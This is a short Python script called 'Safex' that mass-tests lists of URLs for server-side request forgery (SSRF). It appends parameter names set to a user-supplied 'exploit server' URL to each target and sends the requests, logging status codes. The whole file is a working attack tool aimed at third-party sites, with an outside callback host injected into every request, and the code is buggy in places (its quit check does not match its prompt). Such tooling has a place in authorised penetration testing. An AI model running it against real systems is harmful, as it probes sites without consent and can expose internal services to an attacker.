import requests as req;
print("Safex")
print("-------------------------------------------------------")
print("------------------------------------------------")
print("-----------------------------------------")
print("----------------------------------")
print("---------------------------")
print("------------------")
print("---------")
print("Safex is an one script to exploite and detect SSRF vulnerbility and created by Milad Safdari");
a=True;
while a:
    ipu1 = input("Target address : ")
    try:
        targets=open(str(ipu1), "r")
    except:
        print("we can't find your target directory ! plese try again ")
        continue;
    exploit=input("write your exploit server with http : ")
    while(exploit == ""):
        exploit=input("write your exploit server with http")
    if (ipu1 != "" ):
        urls=open(ipu1,"r").readlines()
        ipu = input(
            "do you want to use difault parameters or costume for costume enter 'C' for default enter else : ")
        while (ipu == "c" or ipu == "C"):
            dir_parameters = input("plese enter your parameters directory  : ")
            try:
                params = open(dir_parameters, "r").readlines()
            except:
                print("we can't find your `Parameters` directory ! plese try again  ")
                continue

            # le's start write the basic code

            v=1
            for url in urls:
                value=1;
                for param in params:
                    url=url.replace("\n","")
                    param=param.replace("\n","")
                    exploit=exploit.replace("\n","")
                    value=value+1;
                    result=open("./result/result.txt","a");
                    result.write(url + "&"+param+"="+exploit);
                    reqq=req.get(url + "&"+param+"="+exploit);
                    print("["+str(reqq.status_code)+"]",v," - ",value," : " + url + "&"+param+"="+exploit);
                v=1+v;
            result.close()
            inp2=input("TO quit press 'q' : ")
            if (inp2 == "q"):
                print("bay :)")
                exit()
        params = open("./source/params.txt", "r").readlines()

        ## let's start to write basic code

        v=1
        for url in urls:
            value=1
            for param in params:
                url=url.replace("\n","")
                param=param.replace("\n","")
                exploit=exploit.replace("\n","")
                value=value+1;
                result=open("./result/result.txt","a");
                result.write(url + "&"+param+"="+exploit);
                reqq=req.get(url + "&"+param+"="+exploit);
                print("["+str(reqq.status_code)+"]",v," - ",value," : " + url + "&"+param+"="+exploit);
            v=1+v;
    result.close()
    inp2=input("TO quit press 'q' : ")
    if (inp2=="e"):
        break;
print("bay :)")
exit();
